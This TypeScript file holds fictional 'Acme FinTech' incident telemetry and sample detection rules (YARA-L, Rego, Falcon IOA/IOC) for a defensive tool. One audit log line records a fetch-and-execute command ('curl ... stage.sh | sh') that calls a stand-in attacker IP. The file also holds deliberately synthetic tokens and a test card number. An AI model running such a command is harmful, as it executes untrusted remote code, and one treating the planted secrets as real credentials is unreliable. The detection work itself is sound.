/**
 * 100% Fictional "Acme FinTech" Incident & Detection-as-Code Presets
 * Includes synthetic test credentials so analysts can immediately verify Gatekeeper redaction.
 */

export const ACME_CLOUD_INTRUSION_PRESET = {
  title: "Acme FinTech — Kubernetes Pod Escape & Cloud IAM Service-Account Key Creation",
  rawTelemetry: [
    '2026-05-14T02:11:04Z [WAF] src=185.220.101.42 host=api.acme-fintech.example uri="/v2/export" status=200 ua="curl/8.4.0"',
    '2026-05-14T02:12:19Z [K8S_AUDIT] cluster=prod-eks-01 pod=settlement-worker-7d9f user=system:serviceaccount:payments:settlement-sa verb=create subresource=exec cmd="/bin/sh -c curl -s http://198.51.100.77/stage.sh | sh"',
    '2026-05-14T02:13:02Z [APP_DEBUG_LOG] Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzZXR0bGVtZW50LXNhIiwic2NvcGUiOiJwYXltZW50czpyZWFkIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c',
    '2026-05-14T02:13:45Z [DLP_ALERT] user=alex.rivera@example-corp.com host=CORP-LAPTOP-042 leaked_ci_token=glpat-AbCdEfGhIjKlMnOpQrSt12 sample_pan=4532015112830366',
    '2026-05-14T02:14:30Z [CLOUD_IAM] principal=settlement-sa@acme-prod-01.iam.gserviceaccount.com action=google.iam.admin.v1.CreateServiceAccountKey result=0 src_ip=185.220.101.42',
  ].join("\n"),
};

export const SAMPLE_RULES_BY_SURFACE: Record<string, string> = {
  secops_yaral: `rule cloud_iam_sa_key_created_from_unusual_network {
  meta:
    author = "Detection & Response Engineering"
    description = "Detects Cloud IAM service-account key creation from external IP space"
    mitre_attack_tactic = "Persistence"
    mitre_attack_technique = "T1098.001"
    severity = "HIGH"

  events:
    $e.metadata.log_type = "GCP_CLOUDAUDIT"
    $e.metadata.product_event_type = /CreateServiceAccountKey/ nocase

  outcome:
    $event_count = count_distinct($e.metadata.id)

  condition:
    $e
}`,
  wiz_cloud_event_rego: `match {
  input.EventName == "CreateServiceAccountKey"
  input.Result == 0
  not startswith(input.SourceIP, "10.")
}`,
  wiz_cloud_config_rego: `package wiz

default result = "pass"

result = "fail" {
  input.serviceAccountKey.keyType == "USER_MANAGED"
}`,
  falcon_ioa: JSON.stringify(
    {
      name: "Container_Shell_Curl_Stage_Execution",
      ruletype_id: "1",
      disposition_id: 30,
      pattern_severity: "high",
      field_values: [
        {
          name: "CommandLine",
          include: "(?i)curl\\s+.*\\|\\s*(ba)?sh",
          exclude: ["^/usr/local/bin/healthcheck\\.sh$"],
        },
      ],
    },
    null,
    2,
  ),
  falcon_ioc: JSON.stringify(
    [
      {
        type: "sha256",
        value: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        action: "prevent",
      },
      {
        type: "domain",
        value: "c2-stage-cdn.invalid",
        action: "detect",
      },
    ],
    null,
    2,
  ),
};
